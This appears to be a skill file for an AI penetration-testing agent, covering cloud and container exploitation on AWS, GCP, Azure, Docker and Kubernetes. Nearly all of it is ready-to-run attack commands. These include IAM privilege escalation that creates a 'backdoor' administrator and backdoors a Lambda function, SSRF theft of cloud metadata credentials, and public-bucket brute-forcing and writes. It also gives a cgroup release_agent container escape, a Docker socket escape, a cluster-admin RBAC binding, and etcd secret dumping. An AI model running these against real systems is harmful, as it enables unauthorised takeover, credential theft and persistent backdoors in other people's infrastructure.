# /cloud-security + /container-k8s — Cloud & Container Security Testing

> **Skill type:** Exploitation (Cloud)  
> **Source:** 0x0pointer/skills `/cloud-security`, `/container-k8s-security`, 0xsteph/pentest-ai-agents  
> **Chains into:** `/post-exploit`, `/lateral-movement`  
> **Chained from:** `/recon`, `/web-exploit` (via SSRF)

---

## AWS Security Testing

### IAM Enumeration & Escalation
```bash
# Identify current credentials
aws sts get-caller-identity

# Enumerate attached permissions
aws iam list-attached-user-policies --user-name $USER
aws iam list-user-policies --user-name $USER
aws iam get-policy-version --policy-arn $ARN --version-id v1

# Escalation: Lambda update (if lambda:UpdateFunctionCode)
aws lambda update-function-code --function-name TARGET_FUNCTION \
  --zip-file fileb://backdoor.zip

# Escalation: Create new admin user (if iam:CreateUser + iam:AttachUserPolicy)
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor

# Enumerate S3 buckets
aws s3 ls
aws s3 ls s3://bucket-name --recursive
aws s3 cp s3://bucket-name/sensitive-file .

# Check for public S3 buckets
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name
```

### SSRF to AWS Metadata
```bash
# Via SSRF vulnerability → retrieve IMDSv1 credentials
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns role name, then:
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
# Returns: AccessKeyId, SecretAccessKey, Token

# Configure local AWS CLI
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity  # Confirm identity
```

### S3 Misconfiguration
```bash
# Public bucket enumeration
# Common naming patterns
for pattern in "$COMPANY" "$COMPANY-dev" "$COMPANY-staging" "$COMPANY-prod" \
  "$COMPANY-backup" "$COMPANY-assets" "$COMPANY-data"; do
  aws s3 ls s3://$pattern 2>/dev/null && echo "ACCESSIBLE: $pattern"
done

# Anonymous access
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/file . --no-sign-request

# Write access (critical)
echo "test" | aws s3 cp - s3://bucket-name/pentest-$(date +%s).txt --no-sign-request
```

---

## GCP Security Testing

```bash
# Enumerate current permissions
gcloud auth list
gcloud projects list
gcloud iam service-accounts list

# GCS bucket enumeration
gsutil ls gs://
gsutil ls gs://bucket-name
gsutil cat gs://bucket-name/credentials.json

# Metadata service via SSRF
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# IAM escalation
gcloud projects get-iam-policy PROJECT_ID
```

---

## Azure Security Testing

```bash
# Enumerate with compromised credentials
az account list
az ad user list
az ad sp list
az role assignment list

# Metadata via SSRF
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"

# Storage account enumeration
az storage blob list --account-name ACCOUNT --container-name CONTAINER
```

---

## Container Escape

```bash
# Are we in a container?
cat /proc/1/cgroup | grep docker  # Docker
ls /.dockerenv  # Docker
cat /proc/self/mountinfo | grep overlay  # Overlay filesystem

# Docker socket escape
ls -la /var/run/docker.sock
# If accessible:
docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu chroot /host
# Full host filesystem access!

# Privileged container escape
# Check: cat /proc/self/status | grep CapEff
# If all capabilities (CapEff: 0000003fffffffff) → privileged
# Mount host filesystem:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo "id > $host_path/output" >> /cmd && chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" && cat /output

# CVE-2022-0811 (CRI-O) — kernel.core_pattern manipulation
# CVE-2019-5736 (runc) — overwrite runc binary
```

## Kubernetes Exploitation

```bash
# Enumerate from inside a pod
# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# API server access
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
  --server=https://kubernetes.default.svc \
  --insecure-skip-tls-verify \
  auth can-i --list

# If admin rights:
kubectl get secrets --all-namespaces  # Other service account tokens
kubectl exec -it pod-name -- /bin/sh  # Execute in other pods

# RBAC abuse
kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default

# etcd access (if etcd port 2379 is exposed)
ETCDCTL_API=3 etcdctl --endpoints=https://10.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  get /registry/secrets --prefix  # All secrets in plain text!

# Kube-hunter — automated K8s security testing
kube-hunter --remote 10.0.0.0/24 --report json > kube-hunter-results.json
```
